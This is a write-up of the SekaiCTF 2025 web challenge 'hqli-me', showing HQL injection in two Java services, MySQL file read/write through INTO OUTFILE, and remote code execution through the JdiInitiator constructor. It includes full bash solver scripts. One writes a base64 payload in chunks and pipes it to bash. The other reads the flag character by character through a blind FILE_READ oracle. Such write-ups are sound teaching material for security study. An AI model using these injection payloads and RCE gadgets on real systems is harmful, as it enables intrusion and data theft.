---
title: "Web - hqli-me - SekaiCTF 2025"
date: "2025-08-27"
excerpt: "Writeup of the web challenge hqli-me from SekaiCTF 2025"
tags: ["web"]
author: "VXXDXX"
---

## Overview

> Please note that this challenge has no outgoing network access.

Author: irogir  
Solves: 3

![Solves](/static/img/posts/2025-sekai-web-hqli-me/hqli-solves.webp)

Fun challenge focused mostly on RCE via HQL.

---

## 1. General Analysis

The challenge deployment consists of 3 containers:

- `order_service`,
- `authn_service` containing the flag,
- mysql

We can reach any container from within another, but only `order_service` is exposed externally. Both `order_service` and `authn_service` are Java applications that use HQL to query the underlying databases; however, `order_service` uses mysql from another container, while `authn_service` opted for an in-memory H2 db. 


---

## 2. SQLi and Broken Validation in order_service

The `main` function in `order_service` contains the following statement preparation, which is vulnerable to injection.

```java
var sql = "select %s from Order o where o.username=\"%s\"".formatted(fields, authnUser);
var et = HibernateUtil.getSessionFactory().createEntityManager();
var result = et.createQuery(sql).getResultList();
```

The input is sanitized before being inserted into the query.

```java
public static boolean validateFields(String fields) {
    var tokens = fields.split(",");
    for (var i = 0; i < tokens.length; i++) {
        var token = tokens[i].trim();
        // Check if it contains non-alphanumeric character
        if (Pattern.matches("\\W", token)) {
            return false;
        }
    }
    return true;
}
```

There's a subtle bug in it. `Pattern.matches` returns `true` only if the whole input matches the given regex. With the way the code is written, only input consisting of one non-word character will make the validation fail.  

---

## 3. SQLi in authn_service

Similarly, `authn_service` is also susceptible to SQL injection.

```java
var sql = "select s from Session s where s.sessionId = \"%s\"".formatted(sessionId);
```

`authn_service` does no validation itself on the input. This endpoint is used by `order_service`, but in this case, it correctly validates our input, so we can't exploit this injection indirectly via `order_service`.

---

## 4. Exploiting SQLi in order_service

We're going to exploit the SQLi in the `order_service` in two different ways:

- File write/file read in the mysql container,
- Code execution in the `order_service` container.

### File Write/File Read in the mysql Container

For this one, we're going to use the [sql()](https://docs.jboss.org/hibernate/orm/6.4/querylanguage/html_single/Hibernate_Query_Language.html#function-sql) method to embed native SQL in HQL, allowing us to call `LOAD_FILE` and `SELECT ... INTO OUTFILE ...` from mysql and end the statement early with a comment.  
The mysql server has [secure_file_priv](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_secure_file_priv) set to `/var/lib/mysql-files/`.

```
mysql> SHOW VARIABLES LIKE 'secure_file%';
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
```

As the docs state:
> If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.

If we weren't limited by this, we could write and load UDFs to gain RCE. At least, we can still write and read arbitrary data in `/var/lib/mysql-files/`.

![File write](/static/img/posts/2025-sekai-web-hqli-me/file_write.webp)

![File read](/static/img/posts/2025-sekai-web-hqli-me/file_read.webp)

As we can see, even though the first request resulted in `500` status code due to `Column index out of range`, the file write still went through.

### RCE in the orders_container via JdiInitiator Constructor

As mentioned before, one interesting quirk of HQL is that it allows us to call constructors of Java classes with the `new` keyword in the query. For the majority of classes, the constructors do simple assignments of the class fields, so they're not useful at all. One major exception is [JdiInitiator](https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map)). As the docs state

> Start the remote agent and establish a JDI connection to it.

This boils down to launching the `java` executable with a bunch of arguments that we can affect by the constructor arguments. What caught my eye immediately was the `customConnectorArgs` argument:

> customConnectorArgs - custom arguments passed to the connector. These are JDI com.sun.jdi.connect.Connector arguments. The vmexec argument is not supported.

These arguments are a map that's passed to [SunCommandLineLauncher](https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/SunCommandLineLauncher.java). We can see the available argument names:

```java
private static final String ARG_HOME = "home";
private static final String ARG_OPTIONS = "options";
private static final String ARG_MAIN = "main";
private static final String ARG_INIT_SUSPEND = "suspend";
private static final String ARG_QUOTE = "quote";
private static final String ARG_VM_EXEC = "vmexec";

static private final String ARG_VM_INCLUDE_VTHREADS = "includevirtualthreads";
```

Also, the command is launched with the following code:

```java
String command = exePath + ' ' +
                    options + ' ' +
                    "-Xdebug " +
                    "-Xrunjdwp:" + xrun + ' ' +
                    mainClassAndArgs;

// System.err.println("Command: \"" + command + '"');
vm = launch(tokenizeCommand(command, quote.charAt(0)), address, listenKey,
                        transportService());
```

`exePath` is prepended with the value of `home`

```java
if (home.length() > 0) {
    exePath = home + File.separator + "bin" + File.separator + exe;
} else {
    exePath = exe;
}
```

And we can control it!

```java
String home = argument(ARG_HOME, arguments).value();
```

Sadly, whatever we put will be appended with `/bin/${exe}`. The value of `exe` comes from `vm_exec`

```java
String exe = argument(ARG_VM_EXEC, arguments).value();
```

Which, as was noted in the docs, we can't set. But it's not over yet! Going deeper, [tokenizeCommand](https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/AbstractLauncher.java#L70) tokenizes the command respecting a quote character that we control.

```java
String quote = argument(ARG_QUOTE, arguments).value();
```

**New plan: supply a custom ARG_QUOTE and ARG_HOME containing full RCE command abusing custom ARG_QUOTE to split it**

Ekhm, before we proceed, quick tl;dr for cancer HQL syntax:

- create new lists with `new list("a","b","c")`,
- create new maps with `new map("value1" as key1, "value2" as key2)`,
- you might have to do additional fucky-wacky to stop this bitch moaning about "syntax exceptions" and "The used SELECT statements have a different number of columns".

We're gonna use `^` as our `quote` character.

![alt text](/static/img/posts/2025-sekai-web-hqli-me/jdi_initiator_rce.webp)

Let's check the logs:

```
order_service-1  | Caused by: com.sun.jdi.connect.VMStartException: VM initialization failed for: bash -c id>/tmp/win /bin/java -Xdebug -Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n asdf 5
```

Let's check the output of strace:

```
[pid   150] execve("/usr/bin/bash", ["bash", "-c", "id>/tmp/win", "/bin/java", "-Xdebug", "-Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n", "asdf", "5"], ["HOSTNAME=kali", "LANGUAGE=en_US:en", "JAVA_HOME=/opt/java/openjdk", "PWD=/app", "PORT=1337", "HOME=/nonexistent", "LANG=en_US.UTF-8", "JRE_CACERTS_PATH=/opt/java/openjdk/lib/security/cacerts", "SHLVL=0", "LC_ALL=en_US.UTF-8", "PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "JAVA_VERSION=jdk-21.0.8+9"]) = 0
```

Let's check the file system:

```
nobody@kali:/app$ cat /tmp/win
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

It works!

---

## File Read Oracle in authn_service

The dist files in `authn_service` contain the file `/root/flag.s` which contains the flag. This file is compiled into an executable binary file `/flag`that prints it out. The file `/root/flag.s` doesn't get removed by the deployment after `/flag` is compiled. Furthermore, the `authn_service` is run as root. One man's trash is another man's treasure.

```
root@kali:/app# grep -iaobR 'sekai' /root
/root/flag.s:314:SEKAI
root@kali:/app# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   7340  3488 ?        Ss   11:45   0:00 /bin/bash /entrypoint.sh
root          13  0.2  0.5 11976896 191844 ?     Sl   11:45   0:20 java -jar target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar
root          47  0.0  0.0   7604  4180 pts/0    Ss   14:31   0:00 bash
root          65  0.0  0.0  10880  4404 pts/0    R+   14:35   0:00 ps aux
```

This time, the SQL injection is after the `where` clause:

```java
var sql = "select s from Session s where s.sessionId = \"%s\"".formatted(sessionId);
var result = et.createQuery(sql).getResultList();
if (result.isEmpty()) {
    code = 401;
    yield "Unauthorized";
}

var session = (Session) result.get(0);
yield "user=" + session.user.username;
```

If there's a result, we get `200` response back; otherwise, the server responds with `401`. We're going to use `SUBSTRING` and `FILE_READ` to create an oracle that checks for a char at given position in the flag. We can confirm it works with the following 2 requests (note: I exposed `authn_service` locally to make it easier to debug).

![Oracle success](/static/img/posts/2025-sekai-web-hqli-me/oracle_success.webp)

![Oracle fail](/static/img/posts/2025-sekai-web-hqli-me/oracle_fail.webp)

---

## Putting the Pieces Together

Let's list what we've got:

- file write and file read in mysql container under `/var/lib/mysql-files/`,
- RCE in `orders_service`,
- file read oracle in `authn_service`.

By combining all of these together, we can perform code execution in `orders_service` that will read the flag char by char from `authn_service` and then upload it to mysql container under `/var/lib/mysql-files/`. Afterwards, we can read the uploaded flag. Our exploit script will upload the oracle script chunk by chunk onto the `orders_service` container, run it, and poll for the flag in mysql. 

---

## Solver Script

exploit.sh

<!-- {% raw %} -->

```bash
#!/bin/bash

# ==============================================================================
# ---                           CONFIGURATION                                ---
# ==============================================================================

# --- Stage 1 & 2: Authentication and Template Processing ---
LOGIN_URL="http://127.0.0.1:1337/login"
TEMPLATE_FILE="payload_template.sh"
GENERATED_PAYLOAD_FILE="payload.sh"

# --- Stage 3: RCE Trigger ---
RCE_URL="http://127.0.0.1:1337/orders"


# ==============================================================================
# ---                       HELPER FUNCTION (URL ENCODE)                     ---
# ==============================================================================
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * )               printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}


# ==============================================================================
# ---                            MAIN SCRIPT LOGIC                           ---
# ==============================================================================

# --- STAGE 1: AUTHENTICATE AND GET SESSION ID ---
echo "--- Stage 1: Authenticating to get a new session ID ---"
SESSION_ID=$(curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=guest&password=guest" \
  "$LOGIN_URL")

if [[ -z "$SESSION_ID" ]]; then
  echo "Error: Failed to retrieve a session ID from $LOGIN_URL. Aborting." >&2
  exit 1
fi
echo "Successfully retrieved session ID: $SESSION_ID"
echo ""


# --- STAGE 2: GENERATE PAYLOAD SCRIPT FROM TEMPLATE ---
echo "--- Stage 2: Processing the payload template ---"

if [[ ! -r "$TEMPLATE_FILE" ]]; then
    echo "Error: The template file '$TEMPLATE_FILE' was not found or is not readable. Aborting." >&2
    exit 1
fi

sed "s/<<SESSION_ID_HERE>>/$SESSION_ID/g" "$TEMPLATE_FILE" > "$GENERATED_PAYLOAD_FILE"
echo "Generated payload script and saved it to '$GENERATED_PAYLOAD_FILE'."
echo ""


# --- STAGE 3: BASE64 ENCODE PAYLOAD & SEND IN 10 CHUNKS ---
echo "--- Stage 3: Encoding payload and triggering RCE via JdiInitiator gadget (10 chunks) ---"

if [[ ! -r "$GENERATED_PAYLOAD_FILE" ]]; then
    echo "Error: The generated payload file '$GENERATED_PAYLOAD_FILE' could not be read. Aborting." >&2
    exit 1
fi

# 1) Base64 encode without wrapping.
PAYLOAD_B64=$(base64 -w 0 "$GENERATED_PAYLOAD_FILE")
if [[ -z "$PAYLOAD_B64" ]]; then
    echo "Error: Failed to Base64 encode the payload. Aborting." >&2
    exit 1
fi

# 2) Split into 10 (approximately equal) chunks.
TOTAL_LEN=${#PAYLOAD_B64}
CHUNK_COUNT=10
CHUNK_SIZE=$(( (TOTAL_LEN + CHUNK_COUNT - 1) / CHUNK_COUNT ))  # ceil

# 3) Template for 'fields' with placeholder to swap the RCE command.
TEMPLATE_FIELDS='new jdk.jshell.execution.JdiInitiator(5, new list("-XX:OnError=id>/tmp/err.rce","-XX:OnOutOfMemoryError=id>/tmp/err2.rce","-XX:+CrashOnOutOfMemoryError","-jar /app/target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar"), new java.lang.String("asdf"), true, null, 8000, new map("^" as quote,"^bash^-c^^id>/tmp/winz2^^" as home)) UNION select new jdk.jshell.execution.JdiInitiator(0, new list("a","b","c","d"), new java.lang.String("jdk.jshell.execution.RemoteExecutionControl"), true, null, 8000, new java.util.HashMap(2,2))'

echo "Total length: $TOTAL_LEN, chunk size: $CHUNK_SIZE"

for (( i=0; i<CHUNK_COUNT; i++ )); do
    START=$(( i * CHUNK_SIZE ))
    PART="${PAYLOAD_B64:$START:$CHUNK_SIZE}"
    [[ -z "$PART" ]] && { echo "No more data to send at chunk $((i+1))."; break; }

    echo ""
    echo ">>> Preparing request $((i+1))/${CHUNK_COUNT} (bytes ${START}..$((START+${#PART}-1))) (Status 500 is OK)"

    # 4) Build the RCE command for this chunk (append to /tmp/b64).
    #    \${IFS} creates a space between 'echo' and data at execution time.
    RCE_COMMAND="echo\${IFS}$PART>>/tmp/b64"

    # 5) Substitute the placeholder in the fields template.
    MODIFIED_TEMPLATE=$(echo "$TEMPLATE_FIELDS" | sed 's*id>/tmp/winz2*__RCE_COMMAND_PLACEHOLDER__*')
    FIELDS_PAYLOAD_RAW=$(echo "$MODIFIED_TEMPLATE" | sed "s*__RCE_COMMAND_PLACEHOLDER__*${RCE_COMMAND}*")

    # 6) URL-encode the 'fields' and build the POST body.
    FIELDS_PAYLOAD_ENCODED=$(urlencode "$FIELDS_PAYLOAD_RAW")
    DATA="sessionId=${SESSION_ID}&fields=${FIELDS_PAYLOAD_ENCODED}"

    # 7) Wait 1.5 seconds before each request, then send it.
    sleep 1.5
    curl -s -o /dev/null -w "Status:%{http_code}\n" -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Exploit Script)" \
        -H "Accept: */*" \
        --data-binary "$DATA" \
        "$RCE_URL"
done
sleep 1.5
RCE_TRIGGER_COMMAND="cat\${IFS}/tmp/b64|base64\${IFS}-d|bash"
FIELDS_PAYLOAD_TRIGGER_RAW=$(echo "$MODIFIED_TEMPLATE" | sed "s*__RCE_COMMAND_PLACEHOLDER__*${RCE_TRIGGER_COMMAND}*")
FIELDS_PAYLOAD_TRIGGER_ENCODED=$(urlencode "$FIELDS_PAYLOAD_TRIGGER_RAW")
DATA_TRIGGER="sessionId=${SESSION_ID}&fields=${FIELDS_PAYLOAD_TRIGGER_ENCODED}"
curl -s -o /dev/null -w "Status:%{http_code}\n" -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: Mozilla/5.0 (Exploit Script)" \
    -H "Accept: */*" \
    --data-binary "$DATA_TRIGGER" \
    "$RCE_URL"

echo ""
echo "----------------------------------------------------"
echo "The base64 payload was sent in chunks to /tmp/b64 and then executed."
echo "Polling for flag in mysql"

DATA="sessionId=${SESSION_ID}&fields=sql%28%27to_base64%28LOAD_FILE%28%22%2Fvar%2Flib%2Fmysql-files%2Fflag%22%29%29+--+%27%29q"
tmp="$(mktemp)"
trap 'rm -f "$tmp"' EXIT

while :; do
  code="$(curl -sS --path-as-is --compressed \
    -o "$tmp" -w '%{http_code}' \
    -X POST "$RCE_URL" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-raw "$DATA")"

  if [ "$code" = "200" ]; then
    # Try to grab a base64-looking blob; if not, fall back to ignoring garbage.
    if b64="$(tr -d '\r\n' <"$tmp" | grep -oE '[A-Za-z0-9+/=]{16,}' | head -n1)"; then
      if [ -n "$b64" ] && printf '%s' "$b64" | base64 --decode 2>/dev/null; then
        echo
        break
      fi
    fi
    # Fallback: decode while ignoring non-base64 characters (GNU coreutils)
    if decoded="$(base64 --decode --ignore-garbage "$tmp" 2>/dev/null)"; then
      printf '%s\n' "$decoded"
    else
      echo "HTTP 200 received, but could not decode base64. Raw body below:"
      cat "$tmp"
    fi
    break
  fi

  sleep 1
done
```

payload_template.sh

```bash
#!/bin/bash

# ==============================================================================
# ---                           CONFIGURATION                                ---
# ==============================================================================

# --- Stage 1: Flag Exfiltration Configuration ---
EXFIL_URL="http://127.0.0.1:8000/sessionInfo"
REMOTE_FLAG_PATH="/root/flag.s"
START_POSITION=315

# The character set to test for each position.
# Add any other special characters you suspect might be in the flag inside the quotes.
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*().,/?<>~|\`'\"+=;:[]\\ "


# The character that signals the end of the exfiltration.
TERMINATION_CHAR="}"

# --- Stage 2: Remote File Write Configuration ---
WRITE_URL="http://127.0.0.1:1337/orders"
WRITE_SESSION_ID="<<SESSION_ID_HERE>>"
REMOTE_OUTPUT_FILE="/var/lib/mysql-files/flag"


# ==============================================================================
# ---                       HELPER FUNCTION (URL ENCODE)                     ---
# ==============================================================================
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * )               printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}


# ==============================================================================
# ---                      MAIN SCRIPT LOGIC                                 ---
# ==============================================================================

# --- STAGE 1: EXFILTRATE THE FLAG ---
echo "--- Stage 1: Exfiltrating flag from '$REMOTE_FLAG_PATH' ---"
echo "Starting at position: $START_POSITION"
echo "----------------------------------------------------"

EXTRACTED_FLAG=""
POSITION=$START_POSITION

while true; do
    FOUND_CHAR=false
    for (( i=0; i<${#CHARSET}; i++ )); do
        CHAR="${CHARSET:$i:1}"
        
        if [[ "$CHAR" == "'" ]]; then
            ESCAPED_CHAR="\\'"
        else
            ESCAPED_CHAR="$CHAR"
        fi

        # Construct the raw HQL payload for the current character guess
        PAYLOAD_RAW="\" OR SUBSTRING(CAST(FILE_READ('${REMOTE_FLAG_PATH}','utf-8') as string),${POSITION},1)='${ESCAPED_CHAR}' OR s.sessionId=\""

        # URL-encode the payload
        PAYLOAD_ENCODED=$(urlencode "$PAYLOAD_RAW")

        # Perform the curl request and get the status code
        STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --data-binary "sessionId=${PAYLOAD_ENCODED}" \
            "$EXFIL_URL")

        # Check the server's response
        if [[ "$STATUS_CODE" == "200" ]]; then
            echo "Found character at position $POSITION: '$CHAR'"
            EXTRACTED_FLAG+="$CHAR"
            ((POSITION++))
            FOUND_CHAR=true
            
            if [[ "$CHAR" == "$TERMINATION_CHAR" ]]; then
                echo "----------------------------------------------------"
                echo "Termination character '$TERMINATION_CHAR' found. Stage 1 complete."
                break 2
            fi
            
            break
        fi
    done

    if ! $FOUND_CHAR; then
        echo "----------------------------------------------------"
        echo "Could not find a matching character in the charset for position $POSITION."
        break
    fi
done


# --- STAGE 2: WRITE THE EXFILTRATED FLAG TO A REMOTE FILE ---

echo ""
echo "--- Stage 2: Writing exfiltrated flag to '$REMOTE_OUTPUT_FILE' ---"

if [[ -z "$EXTRACTED_FLAG" ]]; then
    echo "Error: Flag exfiltration failed in Stage 1. The flag is empty. Aborting."
    exit 1
fi

echo "Using exfiltrated flag: $EXTRACTED_FLAG"

# Escape characters within the flag content that would break the SQL query's string literal
ESCAPED_FLAG_CONTENT=$(echo "$EXTRACTED_FLAG" | sed -e "s/'/''/g")

# Construct the raw payload for the 'fields' parameter using the new, simpler format.
# Note that we do NOT use SELECT here.
WRITE_PAYLOAD_RAW=$(printf "sql('\"%s\" into outfile \"%s\" -- ')" "$ESCAPED_FLAG_CONTENT" "$REMOTE_OUTPUT_FILE")

echo "Constructed Raw Payload for Stage 2: $WRITE_PAYLOAD_RAW"

# URL-encode the entire payload
WRITE_PAYLOAD_ENCODED=$(urlencode "$WRITE_PAYLOAD_RAW")

# Construct the final data body for the POST request
DATA="sessionId=${WRITE_SESSION_ID}&fields=${WRITE_PAYLOAD_ENCODED}"

echo "Sending POST request to $WRITE_URL..."

# Perform the curl request with verbosity to see the outcome
curl -v -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "$DATA" \
    "$WRITE_URL"

echo ""
echo "----------------------------------------------------"
echo "Exploit complete. If Stage 2 was successful, the content of the flag has been written to '$REMOTE_OUTPUT_FILE' on the database server."
```

<!-- {% endraw %} -->

Once run, you should get an output like this:

```
--- Stage 1: Authenticating to get a new session ID ---
Successfully retrieved session ID: c7876d0db3cdeb7f43c3c49d42e21949

--- Stage 2: Processing the payload template ---
Generated payload script and saved it to 'payload.sh'.

--- Stage 3: Encoding payload and triggering RCE via JdiInitiator gadget (10 chunks) ---
Total length: 6800, chunk size: 680

>>> Preparing request 1/10 (bytes 0..679) (Status 500 is OK)
Status:500

>>> Preparing request 2/10 (bytes 680..1359) (Status 500 is OK)
Status:500

>>> Preparing request 3/10 (bytes 1360..2039) (Status 500 is OK)
Status:500

>>> Preparing request 4/10 (bytes 2040..2719) (Status 500 is OK)
Status:500

>>> Preparing request 5/10 (bytes 2720..3399) (Status 500 is OK)
Status:500

>>> Preparing request 6/10 (bytes 3400..4079) (Status 500 is OK)
Status:500

>>> Preparing request 7/10 (bytes 4080..4759) (Status 500 is OK)
Status:500

>>> Preparing request 8/10 (bytes 4760..5439) (Status 500 is OK)
Status:500

>>> Preparing request 9/10 (bytes 5440..6119) (Status 500 is OK)
Status:500

>>> Preparing request 10/10 (bytes 6120..6799) (Status 500 is OK)
Status:500
Status:500

----------------------------------------------------
The base64 payload was sent in chunks to /tmp/b64 and then executed.
Polling for flag in mysql
SEKAI{test_flag}
```

---

## Final Notes

- You can read the challenge creator's write-up [here](https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/hqli-me/solution/e.py). The official solution uses `CSVWRITE` to achieve stacked sqli to create an alias in H2 for RCE. I wasn't aware it was possible,
- The official solution also uses another method for RCE with `JdiInitiator` via Java code injection. I also came up with yet another way to do it beforehand with `OnError` and heap size JVM flags like so:
```
new jdk.jshell.execution.JdiInitiator(0, new list("-XX:OnError=id>/tmp/err.rce","-XX:OnOutOfMemoryError=id>/tmp/err2.rce","-XX:+CrashOnOutOfMemoryError","-Xmx3m","-XX:MaxMetaspaceSize=8m","-jar /app/target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar"), new java.lang.String("jdk.jshell.execution.RemoteExecutionControl"), true, null, 8000, new java.util.HashMap(2))
```

Funnily enough it worked locally, but not on remote. I'm sure there's a more proper way to trigger it this way. There could be even more ways to RCE with `JdiInitiator`.  

XOXO,  
VXXDXX